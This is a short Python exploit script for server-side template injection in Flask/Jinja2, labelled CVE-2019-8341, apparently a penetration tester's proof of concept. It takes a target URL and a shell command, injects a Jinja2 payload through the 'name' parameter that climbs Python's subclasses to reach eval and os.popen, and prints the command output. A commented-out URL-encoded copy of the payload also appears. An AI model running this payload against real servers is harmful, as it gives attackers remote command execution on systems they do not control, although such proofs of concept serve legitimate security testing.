# coding=utf-8
"""
DATE:   2021/6/22
AUTHOR: TesterCC
"""

'''
CVE-2019-8341_Flask_Jinja2 Flask（Jinja2） 服务端模板注入漏洞

python CVE-2019-8341.py -u http://10.0.X.69:5000 -c "whoami"
'''

import requests
import optparse

# url = 'http://10.x.x.148:5000'
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target url (e.g. http://10.0.4.148:5000)")
parser.add_option('-c', '--cmd', action="store", dest="cmd", help="cmd for test", default="id")
options, args = parser.parse_args()
if not options.url:
    print( "[-] Specify an uri target")
    exit()

if not options.cmd:
    print( "[-] Specify cmd for test")
    exit()

url = options.url
cmd = options.cmd
# url_test = url + '/?name={{233*233}}'
# cmd = 'id'
# url_cmd = url + '''/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22'''+cmd+'''%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'''
url_cmd = url + '/?name=' + '''{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("''' + cmd + '''").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}'''
res = requests.get(url_cmd)
res = res.text.replace("\n", "")

print(res)